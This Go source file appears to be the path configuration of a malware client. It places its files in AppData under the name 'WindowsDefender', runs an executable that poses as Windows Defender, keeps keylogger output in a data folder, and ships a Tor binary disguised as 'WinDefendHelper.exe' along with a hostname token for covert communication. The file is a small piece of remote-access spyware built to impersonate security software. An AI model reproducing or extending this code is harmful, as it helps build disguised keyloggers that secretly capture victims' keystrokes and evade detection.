package client

import (
	"os"
	"path/filepath"
)

var (
	Path    = filepath.Join(os.ExpandEnv("$AppData"), "WindowsDefender")
	PathExe = filepath.Join(Path, "WindowsDefender.exe")
	// LogPath must be the same as the LogPath in keylogger
	LogPath      = filepath.Join(Path, "data")
	TempZip      = filepath.Join(Path, "temp.zip")
	TorPath      = filepath.Join(Path, "Helper")
	TorExe       = filepath.Join(TorPath, "WinDefendHelper.exe")
	TorData      = filepath.Join(Path, "Helper", "conf")
	HostnamePath = filepath.Join(Path, "token")
)
